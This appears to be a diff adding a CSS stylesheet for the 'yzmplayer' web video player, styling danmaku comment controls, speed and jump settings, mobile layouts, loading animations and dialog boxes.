+	position: absolute;
+	right: 0;
+}
+
+#link3_tip:after {
+	overflow: hidden;
+	display: inline-block;
+	vertical-align: bottom;
+	animation: ellipsis 2s infinite;
+	content: "\2026";
+}
+
+@keyframes ellipsis {
+	from {
+		width: 2px;
+	}
+
+	to {
+		width: 15px;
+	}
+}
+
+#link3 d {
+	margin-left: 10px;
+	color: #fff;
+	-font-weight: bold;
+	padding: 2px 10px;
+	background: #666;
+	border-radius: 4px;
+}
+
+#link3 e {
+	font-weight: bold;
+	float: left;
+}
+
+.loading .pic {
+	background: url() no-repeat;
+	width: 80px;
+	height: 115px;
+	background-size: 100%;
+	margin: 0 auto;
+	position: absolute;
+	/* bottom: 62px; */
+	/* right: 45px; */
+	margin: -65px 0 0 -40px;
+	pointer-events: none;
+	border: 0;
+	border-color: unset;
+	opacity: 1;
+	border-radius: 0;
+	width: 70px;
+	height: 100px;
+	-moz-animation: spinoffPulse .9s infinite linear;
+	-webkit-animation: unset;
+	background-size: 100%;
+	top: 50%;
+	left: 50%;
+	height: 110px;
+	width: 80px;
+}
+
+.loading .tips {
+	/* position: absolute;*/
+	z-index: 2;
+	color: #666;
+	text-align: center;
+	width: 200px;
+	margin: 0 auto;
+	font-size: 12px;
+	margin-left: -60px;
+}
+
+@-webkit-keyframes vod_loading {
+	0% {
+		background-position: 0 0;
+	}
+
+	to {
+		background-position: 0 -600px;
+	}
+}
+
+.yzmplayer-setting-speeds {
+	padding: 0px 5px !important;
+	margin-right: 5px !important;
+}
+
+.yzmplayer-setting-speeds .title {
+	/*height: 19px !important;*/
+	padding: 0px 8px !important;
+	/*border-radius: 17px;*/
+	/*background-color: rgba(255, 255, 255, 0.2) !important;*/
+	color: #ececec;
+	line-height: 24px;
+	font-weight: 600;
+}
+
+.yzmplayer-setting-speeds:hover .title {
+	/*background-color: #00a1d6 !important;*/;
+}
+
+.speed-stting {
+	position: absolute;
+	left: -10px;
+	bottom: 45px;
+	-webkit-transform: scale(0);
+	transform: scale(0);
+	width: 70px;
+	padding: 7px 0;
+	-webkit-transition: all .3s ease-in-out;
+	transition: all .3s ease-in-out;
+	overflow: hidden;
+	z-index: 2;
+	text-align: center;
+	background: rgba(21, 21, 21, .9);
+	border-radius: 2px;
+}
+
+.yzmplayer-setting-speed-item:active,
+.dpplayer-setting-speed-item:hover {
+	background: rgba(255, 255, 255, 0.25);
+}
+
+.speed-stting-open {
+	-webkit-transform: scale(1);
+	transform: scale(1);
+}
+
+.showdan-setting {
+	padding: 0px 5px;
+	position: relative;
+	float: left;
+	display: block !important;
+	top: 5px;
+}
+
+.showdan-setting .yzmplayer-toggle input:checked+label:before {
+	/*content: "弹";*/
+	width: 12px;
+	margin: 2px 5px;
+}
+
+.showdan-setting .yzmplayer-toggle {
+	top: 4px !important;
+	right: 10px !important;
+}
+
+.showdan-setting .yzmplayer-toggle input+label {
+	background: #757575 !important;
+}
+
+.yzmplayer-mobile .yzmplayer-controller {
+	height: 41px;
+}
+
+.yzmplayer-mobile .yzmplayer-controller .yzmplayer-bar-wrap {
+	bottom: 33px;
+}
+
+.yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons {
+	height: 40px;
+}
+
+.yzmplayer-mobile.yzmplayer .yzmplayer-showing {
+	bottom: 60px;
+}
+
+.yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons .yzmplayer-icon {
+	margin-left: -10px;
+}
+
+.yzmplayer .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box {
+	display: block;
+	width: 40%;
+	margin: 0px 33%;
+	bottom: 0rem;
+}
+
+@media (max-width:950px) {
+	.pc_class .showdan-setting .yzmplayer-toggle {
+		display: none;
+	}
+}
+
+@media (max-width:840px) {
+	.pc_class .yzmplayer .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box {
+		display: none;
+	}
+}
+
+.yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box {
+	height: 30px !important;
+	display: none;
+	position: absolute;
+	-webkit-transition: all .3s ease-in-out;
+	transition: all .3s ease-in-out;
+	z-index: 2;
+	height: 38px;
+	bottom: 3px;
+	color: #fff;
+	width: 98%;
+	margin: 0 auto;
+}
+
+.yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons .yzmplayer-comment {
+	display: inline-block;
+}
+
+.yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-input {
+	outline: none;
+	border: none;
+	padding: 5px 5px;
+	font-size: 14px;
+	/* line-height: 29px; */
+	text-align: center;
+	margin: 0 auto;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box;
+	width: calc((100% - 95px));
+	height: 26px;
+	color: #fff;
+	background: hsla(0, 0%, 100%, .35);
+	border-radius: 4px 0 0px 4px;
+	bottom: 0px;
+	position: relative;
+	float: left;
+}
+
+.yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-send-icon {
+	position: relative;
+	width: 40px;
+	height: 26px;
+	padding: 0px;
+	border-radius: 0px 4px 4px 0;
+	background-color: hsla(0, 0%, 100%, .3);
+	color: hsla(0, 0%, 100%, .5);
+	line-height: 30px;
+	bottom: 0;
+	float: left;
+}
+
+.yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-icon {
+	margin-top: -7px;
+	padding: 7px 5px;
+}
+
+.yzmplayer-mobile .yzmplayer-controller .yzmplayer-bar-wrap:hover .yzmplayer-bar .yzmplayer-played .yzmplayer-thumb {
+	margin-top: -11px;
+}
+
+.yzmplayer-mobile .yzmplayer-controller .yzmplayer-bar-wrap:hover .yzmplayer-bar,
+.yzmplayer-mobile .yzmplayer-controller .yzmplayer-bar-wrap:hover .yzmplayer-bar .yzmplayer-loaded,
+.yzmplayer-mobile .yzmplayer-controller .yzmplayer-bar-wrap:hover .yzmplayer-bar .yzmplayer-played {
+	height: 2px;
+}
+
+.yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzm-yzmplayer-send-icon {
+	height: 26px;
+	padding: 0px;
+	line-height: 26px;
+	margin-left: 0px;
+}
+
+.yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzm-yzmplayer-comment-input {
+	line-height: 26px;
+	text-align: center;
+	margin: 0 auto;
+	width: calc((100% - 155px));
+	height: 26px;
+	text-overflow: ellipsis;
+}
+
+.yzmplayer-mobile .yzmplayer-danmaku .yzmplayer-danmaku-right.yzmplayer-danmaku-move,
+.yzmplayer-mobile .yzmplayer-danmaku .yzmplayer-danmaku-top.yzmplayer-danmaku-move,
+.yzmplayer-mobile .yzmplayer-danmaku .yzmplayer-danmaku-bottom.yzmplayer-danmaku-move {
+	font-family: é»‘ä½“;
+	text-shadow: rgb(0, 0, 0) 1px 1px 2px;
+	font-size: 16px !important;
+}
+
+.yzmplayer-comment-setting-box .yzmplayer-op-block {
+	position: absolute;
+	width: 100%;
+	height: 30px;
+	left: 0;
+	bottom: -28px;
+}
+
+.yzmplayer-setting-origin-panel .yzmplayer-op-block {
+	position: absolute;
+	width: 100%;
+	height: 25px;
+	left: 0;
+	bottom: -25px;
+}
+
+.yzmplayer-comment-setting-box .yzmplayer-setting-danmaku .yzmplayer-danmaku-bar-wrap {
+	padding: 5px 10px;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box;
+	/* display:none; */
+	vertical-align: middle;
+	height: 100%;
+	width: 150px;
+	margin: 0 10px;
+}
+
+.yzmplayer-comment-setting-box .yzmplayer-setting-danmaku .yzmplayer-danmaku-bar-wrap .yzmplayer-danmaku-bar {
+	position: relative;
+	top: 8.5px;
+	width: 100%;
+	height: 3px;
+	background: #fff;
+	-webkit-transition: all .3s ease-in-out;
+	transition: all .3s ease-in-out;
+}
+
+.yzmplayer-comment-setting-box .yzmplayer-setting-danmaku .yzmplayer-danmaku-bar-wrap .yzmplayer-danmaku-bar .yzmplayer-danmaku-bar-inner {
+	position: absolute;
+	bottom: 0;
+	left: 0;
+	height: 100%;
+	-webkit-transition: all .1s ease;
+	transition: all .1s ease;
+	background: #00a0d5;
+	will-change: width;
+}
+
+.yzmplayer-comment-setting-box .yzmplayer-setting-danmaku .yzmplayer-danmaku-bar-wrap .yzmplayer-danmaku-bar .yzmplayer-danmaku-bar-inner .yzmplayer-thumb {
+	position: absolute;
+	top: 0;
+	right: 5px;
+	margin-top: -4px;
+	margin-right: -10px;
+	height: 11px;
+	width: 11px;
+	border-radius: 50%;
+	cursor: pointer;
+	-webkit-transition: all .3s ease-in-out;
+	transition: all .3s ease-in-out;
+	background: #00a0d5;
+}
+
+
+/** */
+.yzmplayer-comment-setting-box .yzmplayer-setting-danmaku-proportion .yzmplayer-danmaku-bar-wrap {
+	padding: 5px 22px;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box;
+	/* display:none; */
+	vertical-align: middle;
+	height: 100%;
+	width: 100%;
+	margin: 0 !important;
+}
+
+.yzmplayer-comment-setting-box .yzmplayer-setting-danmaku-proportion .yzmplayer-danmaku-bar-wrap .yzmplayer-danmaku-bar {
+	position: relative;
+	top: 8.5px;
+	width: 100%;
+	height: 3.5px;
+	background: #fff;
+	-webkit-transition: all .3s ease-in-out;
+	transition: all .3s ease-in-out;
+}
+
+.yzmplayer-comment-setting-box .yzmplayer-setting-danmaku-proportion .yzmplayer-danmaku-bar-wrap .yzmplayer-danmaku-bar .yzmplayer-danmaku-bar-inner {
+	position: absolute;
+	bottom: 0;
+	left: 0;
+	height: 100%;
+	-webkit-transition: all .1s ease;
+	transition: all .1s ease;
+	background: #00a0d5;
+	will-change: width;
+}
+
+.yzmplayer-comment-setting-box .yzmplayer-setting-danmaku-proportion .yzmplayer-danmaku-bar-wrap .yzmplayer-danmaku-bar .yzmplayer-danmaku-bar-inner .yzmplayer-thumb {
+	position: absolute;
+	top: 0;
+	right: 5px;
+	margin-top: -4px;
+	margin-right: -10px;
+	height: 11px;
+	width: 11px;
+	border-radius: 50%;
+	cursor: pointer;
+	-webkit-transition: all .3s ease-in-out;
+	transition: all .3s ease-in-out;
+	background: #00a0d5;
+}
+
+.yzmplayer-comment-setting-box .yzmplayer-setting-danunlimit {
+	height: 30px;
+	line-height: 30px;
+	display: flex;
+	justify-content: space-between;
+}
+
+.yzmplayer-comment-setting-box .yzmplayer-setting-danunlimit .yzmplayer-toggle {
+	position: relative;
+	float: right;
+}
+
+.yzmplayer-comment-setting-box .yzmplayer-setting-danmaku {
+	height: 30px;
+}
+
+.yzmplayer-comment-setting-box .yzmplayer-setting-danmaku .yzmplayer-label {
+	float: inherit;
+	line-height: 30px;
+	width: 100%;
+	justify-content: center;
+}
+
+.yzmplayer-comment-setting-box .yzmplayer-setting-danmaku .yzmplayer-danmaku-bar-wrap {
+	-width: 50%;
+	float: right;
+}
+
+.yzmplayer-comment-setting-box .yzmplayer-setting-danmaku-proportion {
+	height: 30px;
+}
+
+.yzmplayer-comment-setting-box .yzmplayer-setting-danmaku-proportion .yzmplayer-label {
+	float: inherit;
+	line-height: 30px;
+	width: 100%;
+	justify-content: center;
+}
+
+.yzmplayer-comment-setting-box .yzmplayer-setting-danmaku-proportion .yzmplayer-danmaku-bar-wrap {
+	-width: 50%;
+	float: right;
+}
+
+.yzmplayer-bezel .yzmplayer-bezel-icon,
+.yzmplayer-bezel .diplayer-loading-icon .diplayer-loading-hide,
+.yzmplayer:-webkit-full-screen .yzmplayer-full-icon,
+.yzmplayer-fulled #yemian,
+#tuichuuyemian,
+.yzmplayer-info-panel-item-danmaku-api,
+.yzmplayer-comment-input,
+.yzmplayer-send-icon,
+.yzmplayer-comment,
+.yzmplayer-mobile .yzmplayer-controller.yzmplayer-controller-comment .yzmplayer-icons,
+.svg-icon,
+.yzmplayer-mobile .dmrules,
+.yzmplayer-setting-speed {
+	display: none;
+}
+
+.danmu-off #link2,
+.danmu-off .yzmplayer-comment-box,
+.danmu-off .yzmplayer-list-icon,
+.yzmplayer .yzmplayer-fulloff-icon,
+.yzmplayer-info-panel-item-danmaku-api,
+.yzmplayer-comment-input,
+.yzmplayer-send-icon,
+.yzmplayer-mobile .yzmplayer-list-icon,
+.yzmplayer-bezel .diplayer-loading-icon svg,
+.yzmplayer-mobile .yzmplayer-setting-speeds,
+.danmu-off #link2-success {
+	display: none !important;
+}
+
+.yzmplayer.yzmplayer-hide-controller .yzmplayer-cplayer .vod-title .video-info {
+	opacity: 0;
+	-webkit-transform: translateY(-100%);
+	transform: translateY(-100%);
+}
+
+.yzmplayer-cplayer .video-info,
+.yzmplayer-mobile .yzmplayer-setting-speed {
+	display: block !important;
+}
+
+.yzmplayer-cplayer .video-info {
+	transition: all .3s ease;
+	position: absolute;
+	z-index: 3;
+	width: 100%;
+	color: #FFF;
+	background: linear-gradient(rgba(0, 0, 0, .5), rgba(0, 0, 0, .2), rgba(0, 0, 0, 0));
+}
+
+.yzmplayer-cplayer {
+	position: fixed;
+	z-index: 3;
+	right: 5px;
+	bottom: 0px;
+}
+
+.yzmplayer-cplayer .video-info .u-title {
+	margin: 10px 20px;
+}
+
+.yzmplayer-cplayer .video-info .u-title #vodtitle,
+.video-info .u-title #vodlink {
+	font-size: 16px;
+	font-weight: 500;
+	color: #fff;
+	margin-right: 5px;
+}
+
+.dmrules {
+	right: 118px;
+	width: 60px;
+	font-size: 12px;
+	vertical-align: top;
+	border-radius: 12px;
+	cursor: inherit;
+	text-align: center;
+	padding: 0 10px;
+	white-space: nowrap;
+	z-index: 4;
+	position: relative;
+	height: 34px;
+	line-height: 34px;
+}
+
+.dmrules a {
+	color: #e5e5e5;
+	text-underline-position: under;
+}
+
+.yzmplayer-mobile .showdan-setting {
+	float: right;
+	margin-right: 25px;
+}
+
+.thing {
+	position: fixed;
+	top: 50%;
+	left: 50%;
+	margin-top: -45px;
+	margin-left: -45px;
+	width: 90px;
+	height: 90px;
+	transform: rotate(45deg);
+	animation: rotateit 1.5s ease infinite;
+}
+
+.beam {
+	width: 30px;
+	height: 30px;
+	border-radius: 10px;
+	position: absolute;
+}
+
+.r {
+	background-color: #e74c3c;
+}
+
+.b {
+	background-color: #3498db;
+}
+
+.r1 {
+	transform: rotate(90deg);
+	left: 30px;
+	top: 0px;
+	animation: move1r 1.5s ease infinite;
+}
+
+.r3 {
+	top: 30px;
+	animation: move2 1.5s ease infinite;
+}
+
+.b1 {
+	transform: rotate(90deg);
+	left: 30px;
+	top: 60px;
+	animation: move1b 1.5s ease infinite;
+}
+
+.b3 {
+	top: 30px;
+	left: 60px;
+	animation: move2 1.5s ease infinite;
+}
+
+@-webkit-keyframes rotateit {
+	0% {
+		transform: rotate(0deg);
+	}
+
+	50% {
+		transform: rotate(0deg);
+	}
+
+	100% {
+		transform: rotate(90deg);
+	}
+}
+
+@keyframes rotateit {
+	0% {
+		transform: rotate(0deg);
+	}
+
+	50% {
+		transform: rotate(0deg);
+	}
+
+	100% {
+		transform: rotate(90deg);
+	}
+}
+
+@keyframes move1r {
+	0% {
+		top: 0px;
+		transform: rotate(0deg);
+	}
+
+	45% {
+		top: 60px;
+	}
+
+	50% {
+		transform: rotate(0deg);
+	}
+
+	100% {
+		top: 60px;
+		transform: rotate(-90deg);
+	}
+}
+
+@keyframes move2 {
+	50% {
+		transform: rotate(0deg);
+	}
+
+	100% {
+		transform: rotate(-90deg);
+	}
+}
+
+@keyframes move1b {
+	0% {
+		top: 60px;
+		transform: rotate(0deg);
+	}
+
+	45% {
+		top: 0px;
+	}
+
+	50% {
+		transform: rotate(0deg);
+	}
+
+	100% {
+		top: 0px;
+		transform: rotate(-90deg);
+	}
+}
+/*.yzmplayer-full-icon span svg,*/
+/*.yzmplayer-fulloff-icon span svg {*/
+/*	display: none;*/
+/*}*/
+.yzmplayer-full-icon span,
+.yzmplayer-fulloff-icon span {
+	background-size: contain !important;
+	float: left;
+	width: 22px;
+	height: 22px;
+}
+
+.yzmplayer-full-icon span {
+	/*background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iODhweCIgaGVpZ2h0PSI4MHB4IiB2aWV3Qm94PSIwIDAgODggODAiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogU2tldGNoIDUyLjUgKDY3NDY5KSAtIGh0dHA6Ly93d3cuYm9oZW1pYW5jb2RpbmcuY29tL3NrZXRjaCAtLT4KICAgIDx0aXRsZT5iZnFfem1xcDwvdGl0bGU+CiAgICA8ZGVzYz5DcmVhdGVkIHdpdGggU2tldGNoLjwvZGVzYz4KICAgIDxnIGlkPSJiZnFfem1xcCIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoOC4wMDAwMDAsIDQuMDAwMDAwKSIgZmlsbC1ydWxlPSJub256ZXJvIj4KICAgICAgICAgICAgPHJlY3QgaWQ9IlJlY3RhbmdsZS01IiB4PSIwIiB5PSIwIiB3aWR0aD0iNzIiIGhlaWdodD0iNzIiPjwvcmVjdD4KICAgICAgICAgICAgPHBhdGggZD0iTTUyLDggTDY0LDggQzY2LjIwOTEzOSw4IDY4LDkuNzkwODYxIDY4LDEyIEw2OCwyNCBNNjgsNDggTDY4LDYwIEM2OCw2Mi4yMDkxMzkgNjYuMjA5MTM5LDY0IDY0LDY0IEw1Miw2NCBNMjAsNjQgTDgsNjQgQzUuNzkwODYxLDY0IDQsNjIuMjA5MTM5IDQsNjAgTDQsNDggTTQsMjQgTDQsMTIgQzQsOS43OTA4NjEgNS43OTA4NjEsOCA4LDggTDIwLDgiIGlkPSLlvaLnirYiIHN0cm9rZT0iI0ZGRkZGRiIgc3Ryb2tlLXdpZHRoPSI4IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiPjwvcGF0aD4KICAgICAgICAgICAgPHBhdGggZD0iTTgsMTIgTDI0LjE5NjQ0MTQsMjUuODgyNjY0MSBMMjguMDM4ODgxMiwyOS4xNzYxODM5IE00NC4wODQyNzk2LDQyLjkyOTM4MjUgTDQ4LjE0NzEyOTYsNDYuNDExODI1MyBMNjQsNjAiIGlkPSLlvaLnirYiIHN0cm9rZT0iI0ZGRkZGRiIgc3Ryb2tlLXdpZHRoPSI4IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiPjwvcGF0aD4KICAgICAgICAgICAgPHBhdGggZD0iTTY0LDEyIEw0NC4wMTU0MTQzLDI5LjEyOTY0NDkgTTI4LjA1MjQ1OTIsNDIuODEyMTc3OCBMMjQuMjIzNDM0LDQ2LjA5NDE5OTUgTDgsNjAiIGlkPSLlvaLnirYiIHN0cm9rZT0iI0ZGRkZGRiIgc3Ryb2tlLXdpZHRoPSI4IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiPjwvcGF0aD4KICAgICAgICA8L2c+CiAgICA8L2c+Cjwvc3ZnPg==) center no-repeat;*/;
+}
+
+.yzmplayer-fulloff-icon span {
+	/*background: url(https://vkceyugu.cdn.bspapp.com/VKCEYUGU-deddf8b2-5b52-4f5f-ac8f-84ebecb88280/4853c0ec-1f19-44cf-adcb-83e5d1595b55.webp) center no-repeat;*/;
+}
+
+#vod-title {
+	overflow: unset;
+	width: 285px;
+	white-space: normal;
+	color: #fb7299;
+}
+
+#vod-title e {
+	padding: 2px;
+}
+
+.layui-layer-dialog {
+	text-align: center;
+	font-size: 16px;
+	padding-bottom: 10px;
+}
+
+.layui-layer-setwin .layui-layer-close {
+	top: 5px;
+	background-repeat: no-repeat;
+	background-position: center;
+}
+
+.layui-layer-btn.layui-layer-btn- {
+	padding: 10px 5px !important;
+	text-align: center;
+	padding-top: 5px !important;
+	border-top: 1px solid hsla(0,0%,100%,.12);
+}
+
+.layui-layer-title {
+	height: 40px !important;
+	line-height: 40px !important;
+}
+
+.layui-layer-title {
+	font-size: 14px !important;
+}
+
+.layui-layer-btn a {
+	font-size: 12px;
+	padding: 0 11px !important;
+	background-color: hsla(0,0%,100%,.2) !important;
+}
+
+.layui-layer-btn a:hover {
+	border-color: #00a1d6 !important;
+	background-color: hsla(0,0%,100%,.4) !important;
+	color: #fff !important;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-toggle input+label.checked:after {
+	left: 11px;
+}
+
+.yzmplayer-setting-jlast:hover #jumptime,
+.yzmplayer-setting-jfrist:hover #fristtime {
+	display: block;
+	outline-style: none;
+}
+
+#player_pause .tip {
+	color: #f4f4f4;
+	position: absolute;
+	font-size: 14px;
+	background-color: hsla(0, 0%, 0%, 0.42);
+	padding: 2px 4px;
+	margin: 4px;
+	border-radius: 3px;
+	display: flex;
+	align-items: center;
+	cursor: pointer;
+}
+
+#player_pause .tip:hover, #player_pause .tip:active {
+	background-color: rgba(0, 0, 0, 0.8);
+}
+
+#player_pause {
+	position: absolute;
+	z-index: 9999;
+	top: 50%;
+	left: 50%;
+	border-radius: 5px;
+	-webkit-transform: translate(-50%, -50%);
+	-moz-transform: translate(-50%, -50%);
+	transform: translate(-50%, -50%);
+	max-width: 80%;
+	max-height: 80%;
+}
+
+#player_pause img {
+	width: 100%;
+	height: 100%;
+}
+
+#player_pause .close {
+	width: 0.5rem;
+	margin-left: 0.3rem;
+	margin-right: 0.1rem;
+	display: block;
+	padding: 0;
+}
+
+#jumptime::-webkit-input-placeholder,
+#fristtime::-webkit-input-placeholder {
+	color: #ddd;
+	opacity: .5;
+	border: 0;
+}
+
+#jumptime::-moz-placeholder {
+	color: #ddd;
+}
+
+#jumptime:-ms-input-placeholder {
+	color: #ddd;
+}
+
+#jumptime,
+#fristtime {
+	width: 50px;
+	border: 0;
+	background-color: #414141;
+	font-size: 12px;
+	padding: 3px 3px 3px 3px;
+	margin: 2px;
+	border-radius: 12px;
+	color: #fff;
+	/*position: absolute;*/
+	/*left: 12px;*/
+	/*top: 3px;*/
+	display: none;
+	text-align: center;
+}
+
+#link {
+	display: inline-block;
+	width: 100px;
+	height: 35px;
+	line-height: 35px;
+	text-align: center;
+	font-size: 14px;
+	border-radius: 22px;
+	margin: 0px 10px;
+	color: #fff;
+	overflow: hidden;
+	box-shadow: 0px 2px 3px rgba(0, 0, 0, .3);
+	background: rgb(0, 161, 214);
+	position: absolute;
+	z-index: 9999;
+	top: 20px;
+	right: 35px;
+}
+
+#close c {
+	float: left;
+	display: none;
+}
+
+.dmlink,
+.playlink,
+.palycon {
+	float: left;
+	width: 400px;
+}
+
+#link3-error {
+	display: none;
+}
+
+.pc_class .yzmplayer-full-icon span, .pc_class .yzmplayer-fulloff-icon span {
+	width: 24px;
+	height: inherit;
+}
+
+.mb_class #player_pause {
+	width: 65%;
+	max-width: 65%;
+	max-height: 65%;
+}
+
+.mb_class  #player_pause .close {
+	width: 0.3rem;
+	margin-left: 0.15rem;
+	margin-right: 0.07rem;
+}
+
+.mb_class .yzmplayer-box, .yzmplayer {
+	overflow: hidden;
+	height: 100vh;
+}
+
+.mb_class .yzmplayer-video-wrap {
+	position: fixed;
+	z-index: 1;
+}
+
+.mb_class .yzmplayer-video-wrap #video {
+	height: 100%;
+}
+
+.mb_class .yzmplayer-mask {
+	bottom: 6%;
+	position: fixed;
+}
+
+.mb_class #videoBlock {
+	width: 100%;
+	height: 100vh;
+	overflow: hidden;
+}
+
+.mb_class .yzmplayer-controller {
+	padding: 0 0.25rem;
+	height: 1.05rem;
+	bottom: 0rem;
+	position: fixed;
+	z-index: 5;
+}
+
+.mb_class .controller-box {
+	width: 100%;
+	height: 100%;
+	position: relative;
+}
+
+.mb_class #videoNextButton {
+	padding: 0.05rem;
+}
+
+.mb_class #videoNextButton .yzmplayer-icon-content svg {
+	width: 80%;
+}
+
+.mb_class .yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons {
+	height: 100%;
+}
+
+.mb_class .yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons-left {
+	height: 100%;
+	display: flex;
+	justify-content: center;
+	align-items: center;
+	z-index: 1;
+}
+
+.mb_class .yzmplayer-controller .yzmplayer-bar-wrap {
+	padding: 0.1rem 0;
+	bottom: 0.9rem !important;
+	z-index: 2;
+}
+
+.mb_class .yzmplayer-controller .yzmplayer-icons.yzmplayer-icons-right {
+	right: 0rem;
+	height: 100%;
+	display: flex;
+	justify-content: center;
+	align-items: center;
+	z-index: 1;
+}
+
+.mb_class .yzmplayer-notice {
+	position: fixed;
+	bottom: 1.55rem;
+	left: 0.2rem;
+}
+
+.mb_class .yzmplayer .yzmplayer-showing {
+	position: fixed;
+	width: 2rem;
+	height: 1.7rem !important;
+	bottom: 1.4rem;
+	right: 2%;
+	float: none;
+}
+
+.mb_class .yzmplayer-danmaku {
+	bottom: 7%;
+}
+
+.mb_class .yzmplayer-controller-mask {
+	height: 1.3rem;
+}
+
+.mb_class .yzmplayer-controller .yzmplayer-icons .yzmplayer-full-icon {
+	margin-left: 0.3rem !important;
+	position: relative;
+	width: 0.65rem;
+}
+
+.mb_class .yzmplayer-controller .yzmplayer-icons .yzmplayer-live-badge, .yzmplayer-controller .yzmplayer-icons .yzmplayer-time {
+	margin-left: 0.3rem;
+}
+
+.mb_class .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box {
+	left: 0.25rem;
+	right: 0.25rem;
+	width: inherit;
+	bottom: 0.16rem;
+	height: 0.71rem !important;
+}
+
+.mb_class .yzmplayer-controller .yzmplayer-bar-wrap {
+	width: 100%;
+}
+
+.mb_class .yzmplayer-mobile .showdan-setting {
+	margin-top: 0px;
+	margin-left: 0px;
+	margin-right: 0px;
+	margin-bottom: 0px;
+	padding: 0px;
+	float: none;
+	top: 0px;
+	position: absolute;
+	right: 0rem;
+}
+
+.mb_class .yzmplayer-info-panel .yzmplayer-info-panel-item {
+	display: flex;
+	flex-direction: row;
+}
+
+.mb_class .yzmplayer-info-panel .yzmplayer-info-panel-item-title {
+	width: 30%;
+}
+
+.mb_class .yzmplayer-info-panel .yzmplayer-info-panel-item-data {
+	width: 70%;
+}
+
+.mb_class .yzmplayer-controller .yzmplayer-icons .yzmplayer-toggle {
+	top: 0.1rem !important;
+	right: -0.1rem !important;
+}
+
+.mb_class .yzmplayer-controller .yzmplayer-setting-speed .yzmplayer-toggle {
+	top: 0.1rem !important;
+	right: 0.15rem !important;
+}
+
+.mb_class .yzmplayer-controller .yzmplayer-setting-speed .yzmplayer-label {
+	text-indent: 0rem;
+	padding-right: 0;
+}
+
+.mb_class .yzmplayer-controller .yzmplayer-setting-loop .yzmplayer-toggle {
+	top: 0.1rem !important;
+	right: 0.15rem !important;
+}
+
+.mb_class .yzmplayer-controller .yzmplayer-setting-jlast .yzmplayer-toggle {
+	top: 0.1rem !important;
+	right: 0.15rem !important;
+}
+
+.mb_class .yzmplayer-controller .yzmplayer-setting-jfrist .yzmplayer-toggle {
+	top: 0.1rem !important;
+	right: 0.15rem !important;
+}
+
+.mb_class .yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-box {
+	right: -0.95rem;
+	bottom: 1.2rem;
+}
+
+.mb_class .yzmplayer-setting-origin-panel .yzmplayer-op-block {
+	display: none;
+}
+
+.mb_class .yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons .yzmplayer-icon {
+	margin: 0;
+	padding: 0;
+}
+
+.mb_class .yzmplayer-comment-setting-box .yzmplayer-op-block {
+	display: none;
+}
+
+.mb_class .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box {
+	bottom: 0.32rem;
+}
+
+.mb_class .yzmplayer-controller .yzmplayer-icon-content {
+	display: block;
+}
+
+.mb_class .yzmplayer-controller .yzmplayer-comment .yzmplayer-icon {
+	width: 0.63rem !important;
+	position: relative;
+}
+
+.mb_class .yzmplayer-controller .yzmplayer-icons .yzmplayer-icon {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+.mb_class .yzmplayer-controller .yzmplayer-icons .yzmplayer-play-icon {
+	position: relative;
+	left: -0.15rem;
+	width: 0.6rem;
+}
+
+.mb_class .yzmplayer-controller .yzmplayer-icons .yzmplayer-icon.yzmplayer-setting-icon {
+	width: 0.65rem !important;
+	margin-left: 0.4rem;
+	position: relative;
+}
+
+.mb_class .yzmplayer-full-icon span, .mb_class .yzmplayer-fulloff-icon span {
+	width: 0.68rem;
+	height: inherit;
+}
+
+.mb_class .yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzm-yzmplayer-comment-input {
+	width: calc(100% - 2.95rem);
+	height: 0.68rem;
+	line-height: 0.68rem;
+	font-size: 0.3rem;
+	padding: 0.1rem;
+	margin-left: 0.81rem;
+}
+
+.mb_class .yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-icon {
+	margin-left: 0px;
+	margin-top: 0px;
+	margin-right: 0px;
+	margin-bottom: 0px;
+	padding: 0px;
+	width: 0.7rem;
+	height: 0.68rem;
+	position: absolute;
+	left: -0.05rem;
+}
+
+.mb_class .yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzm-yzmplayer-send-icon {
+	height: 0.68rem;
+	width: 1.2rem;
+	font-size: 0.3rem;
+	display: flex;
+	align-items: center;
+}
+
